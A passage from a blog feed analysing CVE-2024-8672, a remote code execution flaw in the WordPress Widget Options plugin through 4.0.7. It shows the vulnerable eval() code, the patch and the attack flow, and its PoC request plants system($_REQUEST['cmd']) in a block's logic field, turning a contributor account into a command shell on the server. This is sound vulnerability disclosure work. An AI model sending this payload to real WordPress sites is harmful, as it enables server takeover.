&lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/metalpriceapi/vulnerability/wordpress-metalpriceapi-1-1-4-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin &amp;lt;= 1.1.4 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-04-cve-2024-8672/</link>
      <pubDate>Thu, 04 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-04-cve-2024-8672/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;The Widget Options – The #1 WordPress Widget &amp;amp; Block Control Plugin&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;Remote Code Execution&lt;/strong&gt; trong tất cả các phiên bản cho đến, và bao gồm, &lt;strong&gt;4.0.7&lt;/strong&gt; thông qua chức năng &lt;strong&gt;display logic&lt;/strong&gt; mở rộng cho nhiều &lt;strong&gt;page builders&lt;/strong&gt;, do plugin cho phép input đi qua &lt;strong&gt;eval()&lt;/strong&gt; mà không có lọc hay kiểm tra capability, khiến kẻ tấn công đã xác thực với quyền &lt;strong&gt;contributor-level access&lt;/strong&gt; trở lên có thể thực thi code trên server; mặc dù đã được &lt;strong&gt;patched&lt;/strong&gt;, vấn đề vẫn tiềm ẩn rủi ro dư thừa vì chưa được gia cố đầy đủ.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-options/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Widget Options&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v4.0.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widgetopts_safe_eval($expression)&#xA;{&#xA;    ob_start();&#xA;    try {&#xA;        $result = (bool) eval(&amp;#34;return $expression;&amp;#34;);&#xA;    } catch (Throwable $e) {&#xA;        return false;&#xA;    }&#xA;    ob_end_clean();&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lỗ hổng xuất phát từ hàm &lt;code&gt;widgetopts_safe_eval&lt;/code&gt; cho phép thực thi lệnh bất kỳ thông qua &lt;code&gt;eval&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v4.1.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widgetopts_safe_eval($expression)&#xA;{&#xA;    if (widgetopts_is_widget_or_post_preview()) {&#xA;        // Always return true for previews unless the user is an administrator&#xA;        if (!current_user_can(&amp;#39;administrator&amp;#39;)) {&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    $validation_result = widgetopts_validate_expression($expression);&#xA;&#xA;    if ($validation_result[&amp;#39;valid&amp;#39;] === false) {&#xA;        return false;&#xA;    }&#xA;&#xA;    if (stristr($expression, &amp;#34;return&amp;#34;) === false) {&#xA;        $expression = &amp;#34;return (&amp;#34; . $expression . &amp;#34;);&amp;#34;;&#xA;    }&#xA;&#xA;    ob_start();&#xA;    try {&#xA;        $result = (bool) (@eval($expression));&#xA;    } catch (\Exception $e) {&#xA;        $result = false;&#xA;    } catch (\Error $e) {&#xA;        $result = false;&#xA;    } catch (\ParseError $e) {&#xA;        $result = false;&#xA;    } catch (\Throwable $e) {&#xA;        $result = false;&#xA;    }&#xA;    ob_end_clean();&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã validate &lt;code&gt;$expression&lt;/code&gt; bằng cách gọi hàm &lt;code&gt;widgetopts_validate_expression&lt;/code&gt;(&lt;a href=&#34;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&lt;/a&gt;)&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin này đăng ký một &lt;strong&gt;filter hook&lt;/strong&gt; vào &lt;code&gt;render_block&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;render_block&amp;#39;, function ($block_content, $parsed_block, $obj) {&#xA;    if (!is_admin()) {&#xA;        add_filter(&amp;#34;render_block_{$obj-&amp;gt;name}&amp;#34;, &amp;#34;blockopts_filter_before_display&amp;#34;, 100, 3);&#xA;    }&#xA;    return $block_content;&#xA;}, 100, 3);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;render_block&lt;/code&gt; được kích hoạt mỗi khi một block được render trong &lt;strong&gt;trình chỉnh sửa mặc định của WordPress (Gutenberg)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không ở môi trường quản trị (&lt;code&gt;!is_admin()&lt;/code&gt;), plugin sẽ gắn thêm filter riêng cho block hiện tại (&lt;code&gt;render_block_{block_name}&lt;/code&gt;) để xử lý nội dung trước khi hiển thị bằng hàm &lt;code&gt;blockopts_filter_before_display&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function blockopts_filter_before_display($block_content, $parsed_block, $obj)&#xA;{&#xA;    ...&#xA;    if (isset($parsed_block) &amp;amp;&amp;amp; isset($parsed_block[&amp;#39;attrs&amp;#39;]) &amp;amp;&amp;amp; (isset($parsed_block[&amp;#39;attrs&amp;#39;][&amp;#39;extended_widget_opts&amp;#39;]) || isset($parsed_block[&amp;#39;attrs&amp;#39;][&amp;#39;extended_widget_opts_block&amp;#39;]))) {&#xA;        ...&#xA;        if (&amp;#39;activate&amp;#39; == $widget_options[&amp;#39;logic&amp;#39;]) {&#xA;&#x9;&#x9;&#x9;// display widget logic&#xA;&#x9;&#x9;&#x9;if (isset($opts[&amp;#39;class&amp;#39;]) &amp;amp;&amp;amp; isset($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;]) &amp;amp;&amp;amp; !empty($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;])) {&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = stripslashes(trim($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;]));&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = apply_filters(&amp;#39;widget_options_logic_override_block&amp;#39;, $display_logic);&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = apply_filters(&amp;#39;extended_widget_options_logic_override_block&amp;#39;, $display_logic);&#xA;&#x9;&#x9;&#x9;&#x9;if ($display_logic === false) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;if ($display_logic === true) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return true;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;// if (stristr($display_logic, &amp;#34;return&amp;#34;) === false) {&#xA;&#x9;&#x9;&#x9;&#x9;// &#x9;$display_logic = &amp;#34;return (&amp;#34; . $display_logic . &amp;#34;);&amp;#34;;&#xA;&#x9;&#x9;&#x9;&#x9;// }&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = htmlspecialchars_decode($display_logic, ENT_QUOTES);&#xA;&#x9;&#x9;&#x9;&#x9;if (!widgetopts_safe_eval($display_logic)) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dòng 4 kiểm tra điều kiện &lt;code&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/code&gt; có được bật hay chưa, ta bật nó trong Admin Dashboard&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#34; title=&#34;Bật Gutenberg Page &amp;amp; Post Block Options&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;enable&lt;/h2&gt;&lt;p&gt;Bật Gutenberg Page &amp;amp; Post Block Options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#39; alt=&#34;enable&#34; height=&#34;670&#34; width=&#34;1676&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bật Gutenberg Page &amp; Post Block Options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ở dòng 6 và dòng 8, đoạn mã kiểm tra xem trường &lt;strong&gt;logic&lt;/strong&gt; có tồn tại và không rỗng. Nếu điều kiện này đúng, hàm &lt;code&gt;widgetopts_safe_eval($display_logic)&lt;/code&gt; sẽ được gọi, dẫn đến việc thực thi bất kỳ lệnh nào được truyền vào.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#34; title=&#34;Trường logic khi submit post&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/logic.png&#34; data-sub-html=&#34;&lt;h2&gt;Logic&lt;/h2&gt;&lt;p&gt;Trường logic khi submit post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#39; alt=&#34;Logic&#34; height=&#34;723&#34; width=&#34;774&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Trường logic khi submit post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ở đây, khi sử dụng &lt;strong&gt;Contributor&lt;/strong&gt; account để tạo post, trường logic đã xuất hiện trong request với giá trị là &lt;code&gt;payload&lt;/code&gt;. Ta hoàn toàn có thể kiểm soát trường này.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker has a Contributor (or higher) account&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Creates or edits a post using Gutenberg&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Inserts malicious PHP into the &amp;#39;Logic&amp;#39; field (extended_widget_opts)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Payload is saved in block attributes&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;render_block hook is triggered&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;blockopts_filter_before_display() is executed&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;widgetopts_safe_eval() is called&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;eval() executes the attacker’s payload&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Remote Code Execution on the server&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Sử dụng Administrator account bật option &lt;strong&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Tạo post với Contributor account:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /index.php/wp-json/wp/v2/posts/170?_locale=user&amp;amp;cmd=ls&amp;#43;/ HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;{&amp;#34;id&amp;#34;:170,&amp;#34;title&amp;#34;:&amp;#34;testing&amp;#34;,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:paragraph {\&amp;#34;atts\&amp;#34;:{\&amp;#34;id_base\&amp;#34;:-1,\&amp;#34;column\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;12\&amp;#34;},\&amp;#34;alignment\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;default\&amp;#34;},\&amp;#34;roles\&amp;#34;:{\&amp;#34;state\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;visibility\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;acf\&amp;#34;:{\&amp;#34;visibility\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;field\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;condition\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;value\&amp;#34;:\&amp;#34;\&amp;#34;}},\&amp;#34;author_page\&amp;#34;:{\&amp;#34;author_pages\&amp;#34;:{\&amp;#34;selections\&amp;#34;:\&amp;#34;1\&amp;#34;}},\&amp;#34;devices\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;days\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;dates\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;from\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;to\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;styling\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;bg_image\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;heading\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;list_border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;table_border_color\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;class\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;link\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;id\&amp;#34;:\&amp;#34;a\&amp;#34;,\&amp;#34;classes\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;animation\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;event\&amp;#34;:\&amp;#34;enters\&amp;#34;,\&amp;#34;speed\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;offset\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;delay\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;logic\&amp;#34;:\&amp;#34;system($_REQUEST[\&amp;#34;cmd\&amp;#34;])\&amp;#34;},\&amp;#34;tabselect\&amp;#34;:\&amp;#34;0\&amp;#34;},\&amp;#34;dateUpdated\&amp;#34;:123} --&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#39; alt=&#34;Result&#34; height=&#34;868&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 